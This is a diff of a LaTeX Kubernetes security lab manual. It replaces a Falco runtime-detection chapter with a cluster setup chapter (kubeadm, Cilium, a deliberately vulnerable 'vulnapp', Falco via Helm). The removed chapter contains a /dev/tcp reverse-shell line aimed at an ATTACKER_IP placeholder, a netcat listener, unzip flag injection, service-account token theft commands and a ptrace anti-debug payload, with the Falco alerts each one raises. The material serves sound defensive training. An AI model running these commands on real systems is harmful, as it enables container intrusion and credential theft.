@@ -1,204 +1,166 @@
-\chapter{Runtime Threat Detection}
+\chapter{Initial setup}
+\label{ch:ch2}
 
-In this section, we will simulate a real-world attack against our vulnerable application and observe how Falco detects it. Containers are designed to run isolated applications, but vulnerabilities within the application code itself can be exploited to bypass these boundaries. When an attacker gains remote code execution (RCE) inside a container, they often try to establish a foothold to further explore the cluster, access sensitive secrets mounted in the pod, or perform lateral movements towards other containers.
+The physical setup of this lab consists of a single VM representing our bare-metal infrastructure. This VM will act as an all-in-one Kubernetes \textit{control plane} and \textit{worker node} (Single-Node architecture). This topology is specifically chosen to bypass VXLAN overlay network restrictions present in the CrownLabs environment that drop cross-node pod traffic. The installation process requires the \texttt{kubeadm}, \texttt{kubectl}, and \texttt{kubelet} packages to be installed: the provided CrownLabs image already includes them.
 
-\section{The Attack Scenario}
+\section{Configuring the Kubernetes cluster}
 
-The \texttt{zipapp} application is vulnerable to Command Injection. The application takes a user-uploaded ZIP file and extracts it using the Linux \texttt{unzip} command. Command injections occur when an application passes unsafe user-supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this specific case, an attacker can exploit this by crafting a malicious ZIP file that contains specific filenames acting as flags for the \texttt{unzip} binary (e.g., \texttt{-T} and \texttt{-TT}), fooling the application into executing arbitrary scripts during the extraction phase.
+The Kubernetes control plane, including components such as the API server and the controller manager, governs the cluster behavior. Specifically, the control plane maintains a record of all the Kubernetes objects in the system and runs continuous control loops to manage those objects' state. 
 
-For this lab, we will use this vulnerability to spawn a \textbf{Reverse Shell}. A Reverse Shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using code or command execution is achieved. This technique is often preferred by attackers over a Bind Shell (where the target opens a port and waits for the attacker to connect) because it easily bypasses ingress firewall rules and Network Address Translation (NAT) restrictions, since outbound traffic is rarely filtered as strictly as inbound traffic.
+\subsection{Configuring the control plane node}
 
-\subsection{Preparing the Attacker Listener}
-
-In a real scenario, the attacker would set up a listener on a public IP address or a compromised external server. To avoid networking issues and external dependencies on the CrownLabs environment, we will simulate the attacker's machine by deploying a dedicated pod directly inside the cluster. This pod will act as our listener.
-
-Deploy the attacker pod:
-\begin{lstlisting}[language=bash]
-cat <<EOF > attacker-pod.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: attacker
-spec:
-  containers:
-  - name: ubuntu
-    image: ubuntu
-    command: ['sleep', 'infinity']
-EOF
-kubectl apply -f attacker-pod.yaml
-\end{lstlisting}
-
-Wait for the pod to be running, then find its IP address:
-\begin{lstlisting}[language=bash]
-kubectl get pod attacker -o jsonpath='{.status.podIP}'
-\end{lstlisting}
-
-Take note of this IP (e.g., \texttt{10.244.0.8}). Now, let's install \texttt{netcat} on the attacker pod and start listening for incoming connections on port 4444:
+First, select a VM that is supposed to act as the control plane node and change the name of the machine to clarify its function in the Kubernetes cluster:
 
 \begin{lstlisting}[language=bash]
-kubectl exec -it attacker -- apt-get update
-kubectl exec -it attacker -- apt-get install -y netcat-openbsd
-kubectl exec -it attacker -- nc -lvnp 4444
+sudo hostnamectl set-hostname control-plane-1
 \end{lstlisting}
 
-Leave this terminal open. It is waiting for the reverse shell connection.
-
-\section{Executing the Exploit}
-
-Open a new terminal. The malicious payload \texttt{reverse\_shell.zip} is already included in the \texttt{material/payloads} directory. 
-The payload contains a bash script named \texttt{evil} with the following content:
+\textbf{Warning}: you have to disconnect from the VM and open another SSH session to update the prompt. Then, from the same node, it is possible to leverage \texttt{kubeadm} to initialize the control-plane:
 
 \begin{lstlisting}[language=bash]
-#!/bin/bash
-bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+sudo kubeadm init --pod-network-cidr=10.254.0.0/16 --service-cidr=10.255.0.0/16
 \end{lstlisting}
-\textit{(Where <ATTACKER\_IP> is the IP of your attacker pod).}
 
-Now, interact with the application:
-\begin{enumerate}
-    \item Find the NodePort of the \texttt{zipapp} service (\texttt{kubectl get svc zipapp}) or use port-forwarding:
-    \begin{lstlisting}[language=bash]
-kubectl port-forward service/zipapp 4000:4000
-    \end{lstlisting}
-    \item Open your browser and navigate to \texttt{http://localhost:4000}.
-    \item Log in with any username and password.
-    \item Upload the \texttt{reverse\_shell.zip} file.
-    \item Once uploaded, click the \textbf{``Download All''} button to trigger the vulnerable zip function.
-\end{enumerate}
+\texttt{kubeadm init} first runs a series of pre-flight checks to ensure that the machine is ready to run Kubernetes, then downloads and installs the cluster control plane components. This may take several minutes. As part of the installation process, the previous command will print on screen a join string. \textbf{You can ignore this join string}, as we will not be adding any worker nodes to this cluster.
 
-Go back to your first terminal (the attacker listener). You should see that a connection has been established!
+Once the configuration is completed, it is possible to make \texttt{kubectl} work for the current user:
 
 \begin{lstlisting}[language=bash]
-Listening on 0.0.0.0 4444
-Connection received on 10.244.0.5 42502
-root@zipapp-5ffd444d74-jbwq2:/tmp/80bddfd...# 
+mkdir -p $HOME/.kube
+sudo cp /etc/kubernetes/admin.conf $HOME/.kube/config
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
 \end{lstlisting}
 
-You now have a root shell inside the \texttt{zipapp} container.
+Kubernetes does not embed the logic to interconnect different pods. Instead, it leverages a modular architecture based on the Container Network Interface (CNI). In this lab, we select \textbf{Cilium}, an open-source solution which provides highly scalable networking and security capabilities based on eBPF (Extended Berkeley Packet Filter).
 
-\section{Analyzing Falco Alerts}
-
-The attack was successful: you now have root access inside the application container, demonstrating how a simple code vulnerability can compromise the entire pod. However, Falco was actively monitoring the system calls executed by the kernel. Unlike traditional security tools that rely on static signatures or network traffic, Falco operates at the kernel level using eBPF, giving it deep visibility into every action performed by the containerized processes. 
-
-Let's see what Falco recorded during the exploit. Open a third terminal and check the logs of the Falco daemonset:
-
-\begin{lstlisting}[language=bash]
-kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
-\end{lstlisting}
-
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-Scan the Falco logs. Can you find the alert related to the reverse shell? What is the name of the rule that was triggered?
-\end{tcolorbox}
-
-You should find an entry similar to this:
-
-\begin{lstlisting}[language=bash]
-Notice Redirect stdout/stdin to network connection | gparent=sh ggparent=zip gggparent=python3 fd.sip=10.244.0.8 connection=10.244.0.5:42502->10.244.0.8:4444 lport=42502 rport=4444 fd_type=ipv4 fd_proto=tcp evt_type=dup3 user=root user_uid=0 process=bash proc_exepath=/bin/bash parent=bash command=bash evil ... container_name=zipapp 
-\end{lstlisting}
-
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-Analyze the output of the alert.
+\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Why Cilium and Falco together?]
+Both Cilium and Falco exploit the power of \textbf{eBPF}, a revolutionary Linux kernel technology that allows safe, sandboxed programs to run inside the OS kernel without modifying its source code or loading kernel modules. However, the two tools operate at complementary layers of the security stack:
 \begin{itemize}
-    \item What is the \texttt{evt\_type} (System Call) that triggered the rule?
-    \item Look at the process lineage (\texttt{process}, \texttt{parent}, \texttt{gparent}, \texttt{ggparent}). Does it perfectly describe how the exploit works under the hood?
+    \item \textbf{Cilium} leverages eBPF for \textit{network security}: it enforces Network Policies at layers L3/L4/L7, provides load balancing, and secures east-west traffic between pods. Without a CNI like Cilium, pods cannot communicate at all.
+    \item \textbf{Falco} leverages eBPF for \textit{runtime security}: it intercepts Linux system calls made by containerized processes directly from the kernel, detecting anomalous behaviors such as spawning shells, reading sensitive files, or opening unexpected network connections.
 \end{itemize}
+Together, they represent two fundamental and complementary pillars of cloud-native security: Cilium controls \textit{what can be reached}, while Falco detects \textit{what is happening at runtime}.
 \end{tcolorbox}
 
-\section{Post-Exploitation: Kubernetes Secret Theft}
-
-Obtaining a shell inside a container is often just the first step. A sophisticated attacker will immediately pivot to explore what additional resources they can access. One of the most critical and common post-exploitation techniques in Kubernetes is the theft of the \textbf{Service Account Token}.
-
-By default, Kubernetes automatically mounts a service account token inside every pod at a well-known path:
-\begin{center}
-\texttt{/var/run/secrets/kubernetes.io/serviceaccount/token}
-\end{center}
-This token is a signed JSON Web Token (JWT) that can be used to authenticate against the Kubernetes API server (\texttt{kube-apiserver}). Depending on the RBAC permissions associated with the service account, an attacker could use this token to list secrets, create new pods (e.g., privileged ones to escape to the host), or even take over the entire cluster. This technique is classified under \textit{MITRE ATT\&CK for Containers T1528: Steal Application Access Token}.
-
-\subsection{Executing the Token Theft}
-
-From the reverse shell you obtained in the previous section, run the following commands to read the token and the cluster's CA certificate:
+Before installing Cilium, verify that the control plane node is initialized (it will be in the \texttt{NotReady} state because the network plugin is not yet installed):
 
 \begin{lstlisting}[language=bash]
-# From inside the zipapp container's reverse shell:
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+kubectl get nodes
 \end{lstlisting}
 
-The token will be printed on screen as a long base64-encoded string. Additionally, note the namespace the pod is running in:
+Since we are deploying a single-node cluster, we must remove the default taint on the control plane node so that standard application pods (like our \texttt{vulnapp}) can be scheduled on it. Run the following commands:
 
 \begin{lstlisting}[language=bash]
-cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+kubectl taint nodes --all node-role.kubernetes.io/control-plane:NoSchedule-
+kubectl taint nodes --all node-role.kubernetes.io/master:NoSchedule-
 \end{lstlisting}
 
-The token could then be used from any machine with network access to the API server to attempt further exploitation.
-
-\subsection{Falco Detection: Read Sensitive File Untrusted}
-
-Falco ships with a built-in rule specifically designed to detect this exact behavior. Open a new terminal and check the Falco logs immediately after performing the \texttt{cat} commands:
+Cilium can be installed through the provided CLI:
 
 \begin{lstlisting}[language=bash]
-kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
+curl -L --fail --remote-name-all \
+  https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz
+sudo tar -xzvf cilium-linux-amd64.tar.gz -C /usr/local/bin
+rm cilium-linux-amd64.tar.gz
+cilium install --version 1.15.14
 \end{lstlisting}
 
-You should see an alert similar to the following:
+Once Cilium is installed, wait for it to report that the cluster is healthy:
 
 \begin{lstlisting}[language=bash]
-Warning Read sensitive file untrusted | proc_exepath=/bin/cat gparent=bash ggparent=sh gggparent=unzip file=/run/secrets/kubernetes.io/serviceaccount/token user=root user_uid=0 command=cat /var/run/secrets/kubernetes.io/serviceaccount/token container_name=zipapp image=zipapp:latest
+cilium status --wait
 \end{lstlisting}
 
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-Analyze the output of the new Falco alert.
-\begin{itemize}
-    \item What is the priority level of this alert? Why is it \texttt{Warning} and not \texttt{Critical}?
-    \item Notice the \texttt{gggparent=unzip} in the process lineage. What does this tell you about the full attack chain, from the ZIP upload all the way to the secret theft?
-    \item Can you think of a scenario where a legitimate process inside this container would need to read the service account token? What would be the implication for writing a custom exception for this rule?
-\end{itemize}
-\end{tcolorbox}
+\section{Deploying the vulnerable application}
 
-\section{Ptrace Anti-Debug Attack}
+Now that you have a fully working Kubernetes cluster, we can proceed to deploy the environment required for the security monitoring activities.
 
-The \texttt{ptrace()} system call is a powerful Linux primitive that allows one process to observe and control the execution of another. It is the foundation of debugging tools such as \texttt{gdb} and \texttt{strace}. However, it is also commonly abused by malware authors as an \textbf{anti-debugging technique}.
+We will use \texttt{vulnapp}: a minimal Python web application that simulates a network diagnostic tool. It exposes a form where the user enters a hostname or IP address and the server executes a \texttt{ping} against it. The application is intentionally vulnerable to \textbf{Command Injection} due to the use of unsanitized user input in a shell command --- a deliberate design choice to simulate one of the most common classes of real-world web vulnerabilities (OWASP Top~10 A03: Injection). You will explore this vulnerability in depth in Chapter~\ref{ch:ch3}.
 
-By invoking \texttt{ptrace(PTRACE\_TRACEME, ...)}, a process signals to the operating system that it wishes to be traced. As a side effect, no external debugger can subsequently attach to that process, since only one tracer is allowed at a time. Sophisticated malware uses this technique to detect and evade dynamic analysis environments. This behavior is classified under \textit{MITRE ATT\&CK T1622: Debugger Evasion}.
+The instructor has provided a ZIP archive containing all the necessary materials for this lab (manifests, payloads, and application source). Extract the archive:
 
-In this exercise, we will upload a pre-compiled C binary that performs exactly this syscall and observe how Falco's built-in detection rule fires immediately.
+\begin{lstlisting}[language=bash]
+unzip material.zip
+\end{lstlisting}
 
-\subsection{Executing the Attack}
+The \texttt{vulnapp} Docker image must be built locally on the \textbf{control plane node}, where it will be scheduled to run. Navigate to the folder and build the image:
 
-The attack payload \texttt{ptrace\_payload.zip} is structured identically to the reverse shell payload, exploiting the same command injection vulnerability in \texttt{zipapp}. The archive contains the files \texttt{-T}, \texttt{-TT}, \texttt{bash evil}, and the executable \texttt{evil} script, plus a pre-compiled binary called \texttt{ptrace}. The \texttt{evil} script simply calls \texttt{./ptrace} to execute it.
+\begin{lstlisting}[language=bash]
+cd $HOME/material/vulnapp
+docker build -t vulnapp:latest .
+docker save vulnapp:latest | sudo ctr -n k8s.io images import -
+\end{lstlisting}
 
 \begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Info]
-The \texttt{ptrace\_payload.zip} file is included in the \texttt{material/payloads} directory alongside the other lab materials.
+Since \texttt{kubeadm} uses \texttt{containerd} as the runtime, images built with \texttt{docker} are not immediately visible to Kubernetes. We must explicitly import the image into the \texttt{k8s.io} namespace using \texttt{ctr}. Alternatively, you can use \texttt{sudo nerdctl -n k8s.io build -t vulnapp:latest .} to build directly into the correct namespace.
 \end{tcolorbox}
 
-First, make sure you are \textbf{not} running an active netcat listener from the previous exercise (close that terminal if needed). Then, in a dedicated terminal, start watching the Falco logs in real time:
+Return to the control plane node and deploy the application in the \texttt{default} namespace:
 
 \begin{lstlisting}[language=bash]
-kubectl logs -n falco -l app.kubernetes.io/name=falco -f --tail=0
+kubectl apply -f $HOME/material/manifests/vulnapp-deployment.yaml
+kubectl apply -f $HOME/material/manifests/vulnapp-service.yaml
 \end{lstlisting}
 
-Now upload \texttt{ptrace\_payload.zip} to the \texttt{zipapp} web interface and click \textbf{``Download All''} to trigger execution. The attack completes in less than a second -- unlike the reverse shell, it does not leave a persistent connection open.
-
-\subsection{Falco Detection: PTRACE Anti-Debug Attempt}
-
-Switch to the terminal running Falco logs. You should immediately see an alert similar to the following:
+Verify that the application is running:
 
 \begin{lstlisting}[language=bash]
-Notice PTRACE anti-debug attempt | proc_exepath=/tmp/.../ptrace gparent=bash ggparent=sh gggparent=unzip user=root user_uid=0 process=ptrace parent=bash command=ptrace container_name=zipapp image=zipapp:latest
+kubectl get pods
 \end{lstlisting}
 
-Falco has detected the \texttt{ptrace} syscall with request \texttt{PTRACE\_TRACEME} using the built-in rule \textbf{PTRACE anti-debug attempt}.
+The output should show the \texttt{vulnapp} pod in the \texttt{Running} state:
+\begin{lstlisting}[language=bash]
+NAME                       READY   STATUS    RESTARTS   AGE
+vulnapp-7c4d9f8b4-xk2mp   1/1     Running   0          45s
+\end{lstlisting}
 
-\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
-\begin{itemize}
-    \item Compare the priority levels across all three attacks detected so far:
-    \begin{itemize}
-        \item Reverse Shell: \texttt{Notice}
-        \item Service Account Token Theft: \texttt{Warning}
-        \item Ptrace: \texttt{Notice}
-    \end{itemize}
-    Does the assignment of priority levels seem reasonable to you? Can you think of real-world scenarios where a \texttt{ptrace} call might be legitimate inside a container?
-    \item Look at the process lineage (\texttt{parent}, \texttt{gparent}, \texttt{ggparent}). Is it consistent with the attack chain you executed?
-\end{itemize}
-\end{tcolorbox}
 
+\section{Installing Falco via Helm}
+
+Falco is a CNCF graduated project for runtime security. It parses Linux system calls from the kernel at runtime, and asserts the stream against a powerful rules engine. 
+
+To install Falco in our Kubernetes cluster, we will use Helm. If Helm is not already installed on your control plane node, you can easily install it by running:
+
+\begin{lstlisting}[language=bash]
+curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
+chmod 700 get_helm.sh
+./get_helm.sh
+rm get_helm.sh
+\end{lstlisting}
+
+Add the Falco repository to Helm:
+
+\begin{lstlisting}[language=bash]
+helm repo add falcosecurity https://falcosecurity.github.io/charts
+helm repo update
+\end{lstlisting}
+
+Now install Falco in a dedicated namespace (\texttt{falco}). While eBPF is the modern standard for Falco, we will use the legacy Kernel Module (\texttt{kmod}) driver in this lab. This is a deliberate architectural choice: the kernel provided by the CrownLabs VM environment lacks full BTF (BPF Type Format) support, which is required for modern eBPF probes to function reliably. The \texttt{kmod} driver guarantees compatibility in this specific environment, though it requires the kernel headers to be installed to compile the probe at runtime. Before proceeding, make sure to run the following:
+
+\begin{lstlisting}[language=bash]
+sudo apt-get update
+sudo apt-get install -y linux-headers-$(uname -r)
+\end{lstlisting}
+
+Then, install Falco:
+
+\begin{lstlisting}[language=bash]
+helm install falco falcosecurity/falco \
+  --namespace falco \
+  --create-namespace \
+  --set tty=true \
+  --set driver.kind=kmod
+\end{lstlisting}
+
+Wait a few seconds, then verify that the Falco daemonset has been successfully deployed and the pods are running:
+
+\begin{lstlisting}[language=bash]
+kubectl get pods -n falco
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash]
+NAME          READY   STATUS    RESTARTS   AGE
+falco-4dgzk   2/2     Running   0          39s
+\end{lstlisting}
+
+Falco is now silently monitoring all the system calls in our cluster!
